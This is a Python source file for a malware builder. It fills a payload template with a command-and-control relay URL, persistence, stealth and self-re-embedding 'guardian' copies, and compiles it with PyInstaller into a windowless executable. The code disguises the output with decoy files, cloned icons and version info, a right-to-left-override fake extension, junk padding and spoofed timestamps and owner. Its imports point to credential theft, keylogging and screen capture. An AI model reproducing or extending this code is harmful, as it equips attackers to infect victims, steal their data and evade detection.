# builder.py (Full Code - Simplified for Unified Payload)
import os
import subprocess
import shutil
import tempfile
import sys
import base64
import json
import psutil
from pyinstaller_versionfile import create_versionfile
try:
    import win32file, win32con, win32api, win32security, pywintypes
    PYWIN32_AVAILABLE = True
except ImportError:
    PYWIN32_AVAILABLE = False

def simple_log_filter(line, state):
    # This function remains the same, no changes needed.
    line_strip = line.strip(); line_lower = line_strip.lower()
    log_map = { "pyinstaller bootloader": ("[PyInstaller] Starting executable conversion...", "pyinstaller_start"), "analyzing hidden import": ("[PyInstaller] Analyzing hidden imports...", "hidden_imports"), "including run-time hook": ("[PyInstaller] Including run-time hooks...", "runtime_hooks"), "building c archive": ("[Compiler] Compiling support libraries...", "compiling_c"), "building exe from": ("[Compiler] Compiling main executable...", "compiling_exe"), "appending archive to exe": ("[Bundler] Bundling payload into a single file...", "bundling")}
    for keyword, (message, state_key) in log_map.items():
        if keyword in line_lower and not state.get(state_key):
            state[state_key] = True; return message
    if "pyinstaller:" in line_lower and not state.get("pyi_version"):
        state["pyi_version"] = True; return f"[PyInstaller] v{line_strip.split(':')[-1].strip()}"
    if "python:" in line_lower and not state.get("python_version"):
        state["python_version"] = True; return f"[Python] v{line_strip.split(':')[-1].strip()}"
    if line_strip.startswith('WARN:'): return f"[Warning] {line_strip[5:].strip()}"
    return None

def set_process_priority(pid, priority_level, log_callback):
    # This function remains the same.
    try:
        p = psutil.Process(pid)
        if sys.platform == "win32":
            priority_map = {"Low": psutil.BELOW_NORMAL_PRIORITY_CLASS, "Normal": psutil.NORMAL_PRIORITY_CLASS, "High": psutil.HIGH_PRIORITY_CLASS}
            p.nice(priority_map.get(priority_level, psutil.NORMAL_PRIORITY_CLASS))
        log_callback(f"[Builder] Process priority set to {priority_level}.")
    except Exception as e: log_callback(f"[ERROR] Failed to set build priority: {e}")

def _spoof_file_metadata(file_path, settings, log_callback):
    # This function remains the same.
    if not PYWIN32_AVAILABLE:
        log_callback("[Builder] pywin32 not found. Skipping metadata spoofing.")
        return
    # ... (rest of the function is identical)
    spoof_settings = settings.get("metadata_spoofing", {})
    if spoof_settings.get("timestamps_enabled"):
        log_callback("[Builder] Spoofing file timestamps...")
        try:
            created_dt = spoof_settings["created"].toPyDateTime(); modified_dt = spoof_settings["modified"].toPyDateTime(); created_time = pywintypes.Time(created_dt); modified_time = pywintypes.Time(modified_dt)
            handle = win32file.CreateFile(file_path, win32con.GENERIC_WRITE, win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE, None, win32con.OPEN_EXISTING, win32con.FILE_ATTRIBUTE_NORMAL, None)
            win32file.SetFileTime(handle, created_time, None, modified_time); handle.Close()
        except Exception as e: log_callback(f"[ERROR] Failed to set file timestamps: {e}")
    owner_to_set = spoof_settings.get("owner")
    if spoof_settings.get("owner_enabled") and owner_to_set != "Keep Current":
        log_callback(f"[Builder] Spoofing file owner to '{owner_to_set}'...")
        try:
            sid = win32security.LookupAccountName(None, owner_to_set)[0]; sd = win32security.SECURITY_DESCRIPTOR(); sd.SetSecurityDescriptorOwner(sid, 0)
            win32security.SetFileSecurity(file_path, win32security.OWNER_SECURITY_INFORMATION, sd)
        except pywintypes.error as e:
            if e.winerror == 1314: log_callback("[ERROR] Failed to set owner: This operation requires administrative privileges.")
            else: log_callback(f"[ERROR] Failed to set owner: {e}")
        except Exception as e: log_callback(f"[ERROR] An unexpected error occurred while setting owner: {e}")

def build_payload(settings, relay_url, c2_user, log_callback, thread_object):
    # --- SIMPLIFIED: No longer differentiates between main payload and guardians ---
    main_payload_full_name = settings.get("payload_name") + settings.get("payload_ext")
    embedded_guardians = {}
    all_guardian_names = []

    if settings.get("hydra"):
        guardians_config = settings.get("guardians", [])
        all_guardian_names = [g['name'] + g['ext'] for g in guardians_config]
        all_guardian_names.append(main_payload_full_name) # Main payload is also a guardian

        log_callback("\n[Hydra] Starting pre-build for all payload instances...")
        # First, build the main payload instance to embed into others
        main_payload_data = _compile_single(main_payload_full_name, settings, relay_url, c2_user, log_callback, thread_object, all_guardian_names, is_for_embedding=True)
        if not main_payload_data:
            log_callback(f"[ERROR] Failed to pre-build main payload. Aborting.")
            return None
        embedded_guardians[main_payload_full_name] = main_payload_data

        # Then, build each guardian instance, embedding the main payload
        for guardian_config in guardians_config:
            guardian_full_name = guardian_config['name'] + guardian_config['ext']
            guardian_settings = settings.copy()
            guardian_settings['cloning']['icon'] = guardian_config.get('icon')
            guardian_settings['spoofed_ext'] = guardian_config.get('spoofed_ext')
            
            # Add the already-built main payload to the guardian's embedded dict
            guardian_settings['embedded_guardians'] = {main_payload_full_name: main_payload_data}

            encoded_guardian = _compile_single(guardian_full_name, guardian_settings, relay_url, c2_user, log_callback, thread_object, all_guardian_names, is_for_embedding=True)
            if not encoded_guardian:
                log_callback(f"[ERROR] Failed to pre-build guardian {guardian_full_name}. Aborting.")
                return None
            embedded_guardians[guardian_full_name] = encoded_guardian
            log_callback(f"[Hydra] Instance '{guardian_full_name}' pre-built and encoded.")

    log_callback(f"\n[Builder] Starting final build pass...")
    
    # Final pass: Re-build the main payload with ALL other guardians embedded in it
    final_settings = settings.copy()
    final_settings['embedded_guardians'] = embedded_guardians
    
    final_path = _compile_single(main_payload_full_name, final_settings, relay_url, c2_user, log_callback, thread_object, all_guardian_names, is_for_embedding=False)

    if not final_path:
        log_callback(f"[ERROR] Failed to complete final build pass. Aborting.")
        return None

    log_callback("\n[Builder] Build process completed successfully.")
    return thread_object.proc

def _compile_single(payload_full_name, settings, relay_url, c2_user, log_callback, thread_object, all_guardian_names_for_template, is_for_embedding):
    with tempfile.TemporaryDirectory() as temp_dir:
        pyinstaller_name = os.path.splitext(payload_full_name)[0]
        temp_script_path = os.path.join(temp_dir, f"temp_{pyinstaller_name}.py")
        
        # --- UNIFIED: Always use the same template ---
        template_path = "payload/template.py"
        
        with open(template_path, "r", encoding="utf-8") as f: code = f.read()
        
        # Replace placeholders
        code = code.replace("{{HYDRA_GUARDIANS}}", json.dumps(all_guardian_names_for_template or []))
        code = code.replace("{{PERSISTENCE_ENABLED}}", str(settings.get("persistence", False)))
        code = code.replace("{{END_TASK_POPUP_ENABLED}}", str(settings.get("end_task_popup_enabled", False)))
        code = code.replace("{{END_TASK_POPUP_TITLE}}", json.dumps(settings.get("end_task_popup_title", "")))
        code = code.replace("{{END_TASK_POPUP_MESSAGE}}", json.dumps(settings.get("end_task_popup_message", "")))
        
        embedded_guardians_dict = settings.get('embedded_guardians', {})
        code = code.replace("{{EMBEDDED_GUARDIANS}}", json.dumps(embedded_guardians_dict))
        code = code.replace("{{RELAY_URL}}", f"'{relay_url}'")
        code = code.replace("{{C2_USER}}", f"'{c2_user}'")
        code = code.replace("{{HYDRA_ENABLED}}", str(settings.get("hydra", False)))
        code = code.replace("{{POPUP_ENABLED}}", str(settings.get("popup_enabled", False)))
        code = code.replace("{{POPUP_TITLE}}", json.dumps(settings.get("popup_title", "")))
        code = code.replace("{{POPUP_MESSAGE}}", json.dumps(settings.get("popup_message", "")))
        decoy_filename = "''"; decoy_data_b64 = "''"; bind_path = settings.get("bind_path")
        if bind_path and os.path.exists(bind_path):
            decoy_filename = f"'{os.path.basename(bind_path)}'";
            with open(bind_path, 'rb') as f: decoy_data_b64 = f"'{base64.b64encode(f.read()).decode()}'"
        code = code.replace("{{DECOY_ENABLED}}", str(bool(bind_path)))
        code = code.replace("{{DECOY_FILENAME}}", decoy_filename)
        code = code.replace("{{DECOY_DATA_B64}}", decoy_data_b64)
        code = code.replace("{{STEALTH_MODE}}", str(settings.get("stealth", False)))
        
        with open(temp_script_path, "w", encoding="utf-8") as f: f.write(code)
        
        # PyInstaller command assembly (remains the same)
        command = [sys.executable, "-m", "PyInstaller", '--onefile', '--noconsole', '--name', pyinstaller_name]
        cloning_settings = settings.get("cloning", {})
        if cloning_settings.get("enabled"):
            if cloning_settings.get("icon") and os.path.exists(cloning_settings["icon"]):
                command.extend(['--icon', cloning_settings["icon"]])
            version_file_path = os.path.join(temp_dir, "version.txt")
            create_versionfile(output_file=version_file_path, version=cloning_settings["version_info"].get("FileVersion", "1.0.0.0"), company_name=cloning_settings["version_info"].get("CompanyName", ""), file_description=cloning_settings["version_info"].get("FileDescription", ""), internal_name=cloning_settings["version_info"].get("OriginalFilename", ""), legal_copyright=cloning_settings["version_info"].get("LegalCopyright", ""), original_filename=cloning_settings["version_info"].get("OriginalFilename", ""), product_name=cloning_settings["version_info"].get("ProductName", ""))
            command.extend(['--version-file', version_file_path])

        hidden_imports = ['requests', 'psutil', 'win32crypt', 'mss', 'pynput', 'PIL', 'winreg', 'shutil', 'sqlite3', 'ctypes', 'socket', 'pefile', 'cryptography', 'xml.etree.ElementTree']
        for imp in hidden_imports: command.extend(['--hidden-import', imp])
        command.append(temp_script_path)
        
        process = subprocess.Popen(command, cwd=temp_dir, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0, encoding='utf-8', errors='ignore')
        thread_object.proc = process
        
        log_state = {}; use_simple_logs = settings.get("simple_logs", True)
        for line in iter(process.stdout.readline, ''):
            if not thread_object._is_running: break
            if use_simple_logs:
                simple_msg = simple_log_filter(line, log_state)
                if simple_msg: log_callback(simple_msg)
            else:
                log_callback(line.strip())
        
        process.wait()
        
        if process.returncode == 0 and thread_object._is_running:
            built_exe_path = os.path.join(temp_dir, 'dist', f"{pyinstaller_name}.exe")
            
            # If we're just building to embed, return the base64 data
            if is_for_embedding:
                with open(built_exe_path, 'rb') as f: data = f.read()
                return base64.b64encode(data).decode('utf-8')

            # Otherwise, this is the final build, save it to the output folder
            output_dir = "output";
            if not os.path.exists(output_dir): os.makedirs(output_dir)

            spoofed_ext = settings.get('spoofed_ext')
            final_filename = payload_full_name
            if spoofed_ext:
                rlo_char = '\u202e'; reversed_spoofed_ext = spoofed_ext.strip('.')[::-1]
                final_filename = f"{pyinstaller_name}{rlo_char}{reversed_spoofed_ext}.scr"
                log_callback(f"[RLO Spoof] Renaming to: {final_filename}")

            final_exe_path = os.path.join(output_dir, final_filename)
            shutil.move(built_exe_path, final_exe_path)
            
            padding_settings = settings.get("padding", {});
            if padding_settings.get("enabled"):
                log_callback("[Builder] Adding junk data to file..."); padding_kb = padding_settings.get("size_kb", 0)
                if padding_kb > 0:
                    try:
                        with open(final_exe_path, "ab") as f: f.write(b'\0' * (padding_kb * 1024))
                    except Exception as e: log_callback(f"[ERROR] Could not add padding to file: {e}")
            
            _spoof_file_metadata(final_exe_path, settings, log_callback)
            
            log_callback(f"[Success] '{final_filename}' saved to output folder.")
            log_callback(f"[Location] {os.path.abspath(final_exe_path)}")
            
            return final_exe_path
        elif thread_object._is_running:
            log_callback(f"[ERROR] PyInstaller failed for '{pyinstaller_name}' with code {process.returncode}.")
            return None
        else: return None